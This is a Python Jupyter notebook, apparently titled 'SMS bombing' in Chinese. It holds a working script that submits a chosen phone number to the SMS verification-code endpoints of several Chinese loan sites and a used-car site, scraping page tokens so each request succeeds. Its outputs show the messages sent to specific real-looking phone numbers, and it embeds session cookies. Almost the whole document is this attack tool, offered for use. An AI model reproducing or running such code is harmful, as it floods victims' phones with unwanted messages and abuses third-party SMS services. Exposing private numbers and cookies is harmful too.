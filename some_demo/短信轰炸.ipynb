{
 "cells": [
  {
   "cell_type": "code",
   "execution_count": 2,
   "metadata": {
    "collapsed": true,
    "pycharm": {
     "is_executing": false
    }
   },
   "outputs": [],
   "source": [
    "import json\n",
    "import requests\n",
    "import time\n",
    "from lxml import etree\n",
    "headers = {\n",
    "    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.80 Safari/537.36 Edg/86.0.622.48',\n",
    "    'referer': 'https://www.guazi.com/',\n",
    "    'Connection': 'keep-alive',\n",
    "    'accept-encoding': 'gzip, deflate, br',\n",
    "    'Host': 'www.guazi.com',\n",
    "    'Cache-Control': 'max-age=0',\n",
    "    'Sec-Fetch-Dest': 'document',\n",
    "    'Sec-Fetch-Mode': 'navigate',\n",
    "    'Sec-Fetch-Site': 'same-origin',\n",
    "    'Sec-Fetch-User': '?1',\n",
    "    'Upgrade-Insecure-Requests': '1',\n",
    "    'Cookie': 'uuid=999a6cab-52cb-4a07-f581-332c9d007a38; ganji_uuid=3539163910898028701029; antipas=6SY9R49qK452802N765b855H48; cityDomain=sh; clueSourceCode=%2A%2300; user_city_id=13; sessionid=154e0871-e55b-4aae-b17a-cb4e53877f14; lg=1; lng_lat=121.459204_31.233713; gps_type=1; close_finance_popup=2020-10-21; cainfo=%7B%22ca_a%22%3A%22-%22%2C%22ca_b%22%3A%22-%22%2C%22ca_s%22%3A%22self%22%2C%22ca_n%22%3A%22self%22%2C%22ca_medium%22%3A%22-%22%2C%22ca_term%22%3A%22-%22%2C%22ca_content%22%3A%22-%22%2C%22ca_campaign%22%3A%22-%22%2C%22ca_kw%22%3A%22-%22%2C%22ca_i%22%3A%22-%22%2C%22scode%22%3A%22-%22%2C%22keyword%22%3A%22-%22%2C%22ca_keywordid%22%3A%22-%22%2C%22display_finance_flag%22%3A%22-%22%2C%22platform%22%3A%221%22%2C%22version%22%3A1%2C%22client_ab%22%3A%22-%22%2C%22guid%22%3A%22999a6cab-52cb-4a07-f581-332c9d007a38%22%2C%22ca_city%22%3A%22sh%22%2C%22sessionid%22%3A%22154e0871-e55b-4aae-b17a-cb4e53877f14%22%7D; preTime=%7B%22last%22%3A1603262549%2C%22this%22%3A1603261811%2C%22pre%22%3A1603261811%7D',\n",
    "}"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 39,
   "outputs": [],
   "source": [
    "def zgdk(phone):\n",
    "    data = {'mobile':phone}\n",
    "    response = requests.post(url='https://mgjr.360yhzd.com/api/sms/getCode', data=data)\n",
    "    text = response.text\n",
    "    if '提交成功' in text:\n",
    "        print('正规贷款信息发送成功!')\n",
    "    else:\n",
    "        print('正规贷款信息发送失败！')"
   ],
   "metadata": {
    "collapsed": false,
    "pycharm": {
     "name": "#%% 正规贷款\n",
     "is_executing": false
    }
   }
  },
  {
   "cell_type": "code",
   "execution_count": 36,
   "outputs": [],
   "source": [
    "def rdd(phone):\n",
    "    session = requests.session()\n",
    "    url = 'https://91rongduoduo.com/m/bdss04'\n",
    "    text = session.get(url).text\n",
    "    html = etree.HTML(text)\n",
    "    usertoken = html.xpath('//input[@id=\"usertoken\"]/@value')[0]\n",
    "    data = {\n",
    "        'phone' : phone,\n",
    "        'name' : '张伟伟',\n",
    "        'usertoken' : usertoken\n",
    "    }\n",
    "    response = session.post(url='https://91rongduoduo.com/m/center_code', data=data)\n",
    "    text = response.text\n",
    "    if '发送成功' in text:\n",
    "        print('融多多贷款信息发送成功!')\n",
    "    else:\n",
    "        print('融多多贷款信息发送失败！')\n"
   ],
   "metadata": {
    "collapsed": false,
    "pycharm": {
     "name": "#%% 融多多贷款\n",
     "is_executing": false
    }
   }
  },
  {
   "cell_type": "code",
   "execution_count": 37,
   "outputs": [],
   "source": [
    "def ms(phone):\n",
    "    session = requests.session()\n",
    "    url = 'http://msswxx.com/m/mss01'\n",
    "    text = session.get(url).text\n",
    "    html = etree.HTML(text)\n",
    "    usertoken = html.xpath('//input[@id=\"usertoken\"]/@value')[0]\n",
    "    data = {\n",
    "        'phone' : phone,\n",
    "        'name' : '张伟伟',\n",
    "        'usertoken' : usertoken\n",
    "    }\n",
    "    response = session.post(url='http://msswxx.com/m/center_code', data=data)\n",
    "    text = response.text\n",
    "    if '发送成功' in text:\n",
    "        print('穆帅贷款信息发送成功!')\n",
    "    else:\n",
    "        print('穆帅贷款信息发送失败！')\n"
   ],
   "metadata": {
    "collapsed": false,
    "pycharm": {
     "name": "#%% 穆帅贷款\n",
     "is_executing": false
    }
   }
  },
  {
   "cell_type": "code",
   "execution_count": 40,
   "outputs": [
    {
     "name": "stdout",
     "text": [
      "融多多贷款信息发送成功!\n",
      "正规贷款信息发送成功!\n",
      "穆帅贷款信息发送成功!\n"
     ],
     "output_type": "stream"
    }
   ],
   "source": [
    "rdd('18822119471')\n",
    "zgdk('18822119471')\n",
    "ms('18822119471')"
   ],
   "metadata": {
    "collapsed": false,
    "pycharm": {
     "name": "#%%\n",
     "is_executing": false
    }
   }
  },
  {
   "cell_type": "code",
   "execution_count": 4,
   "outputs": [
    {
     "name": "stdout",
     "text": [
      "{'phone': '18721111311', 'time': '1603266334', 'token': '7bbb415fb6747cffd9e885cb7eda8a81'}\n{'status': False, 'msg': '手机号格式错误'}\n"
     ],
     "output_type": "stream"
    }
   ],
   "source": [
    "headers = {\n",
    "    'Cookie': 'uuid=999a6cab-52cb-4a07-f581-332c9d007a38; ganji_uuid=3539163910898028701029; antipas=6SY9R49qK452802N765b855H48; cityDomain=sh; clueSourceCode=%2A%2300; user_city_id=13; sessionid=154e0871-e55b-4aae-b17a-cb4e53877f14; lg=1; gps_type=1; close_finance_popup=2020-10-21; cainfo=%7B%22ca_a%22%3A%22-%22%2C%22ca_b%22%3A%22-%22%2C%22ca_s%22%3A%22self%22%2C%22ca_n%22%3A%22self%22%2C%22ca_medium%22%3A%22-%22%2C%22ca_term%22%3A%22-%22%2C%22ca_content%22%3A%22-%22%2C%22ca_campaign%22%3A%22-%22%2C%22ca_kw%22%3A%22-%22%2C%22ca_i%22%3A%22-%22%2C%22scode%22%3A%22-%22%2C%22keyword%22%3A%22-%22%2C%22ca_keywordid%22%3A%22-%22%2C%22display_finance_flag%22%3A%22-%22%2C%22platform%22%3A%221%22%2C%22version%22%3A1%2C%22client_ab%22%3A%22-%22%2C%22guid%22%3A%22999a6cab-52cb-4a07-f581-332c9d007a38%22%2C%22ca_city%22%3A%22sh%22%2C%22sessionid%22%3A%22154e0871-e55b-4aae-b17a-cb4e53877f14%22%7D; preTime=%7B%22last%22%3A1603262712%2C%22this%22%3A1603261811%2C%22pre%22%3A1603261811%7D; lng_lat=121.448581_31.338107',\n",
    "    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.75 Safari/537.36',\n",
    "}\n",
    "def gz(phone):\n",
    "    session = requests.session()\n",
    "    url = 'https://www.guazi.com/sh/'\n",
    "    response = session.get(url=url, headers=headers)\n",
    "    response.encoding = response.apparent_encoding\n",
    "    html = etree.HTML(response.text)\n",
    "    token = html.xpath('//div[@class=\"js-check-post-code\"]/@data-str')[0]\n",
    "    \n",
    "    data = {\n",
    "        'phone': phone,\n",
    "        'time': str(int(time.time())),\n",
    "        'token': token,\n",
    "    }\n",
    "    response = session.post(url='https://www.guazi.com/zq_user/?act=register',\n",
    "                           data=data,headers=headers)\n",
    "    print(data)\n",
    "    # print(response.text)\n",
    "    json_data = json.loads(response.text)\n",
    "    print(json_data)\n",
    "gz('18721111311')"
   ],
   "metadata": {
    "collapsed": false,
    "pycharm": {
     "name": "#%% 瓜子\n",
     "is_executing": false
    }
   }
  }
 ],
 "metadata": {
  "kernelspec": {
   "display_name": "Python 3",
   "language": "python",
   "name": "python3"
  },
  "language_info": {
   "codemirror_mode": {
    "name": "ipython",
    "version": 2
   },
   "file_extension": ".py",
   "mimetype": "text/x-python",
   "name": "python",
   "nbconvert_exporter": "python",
   "pygments_lexer": "ipython2",
   "version": "2.7.6"
  },
  "pycharm": {
   "stem_cell": {
    "cell_type": "raw",
    "source": [],
    "metadata": {
     "collapsed": false
    }
   }
  }
 },
 "nbformat": 4,
 "nbformat_minor": 0
}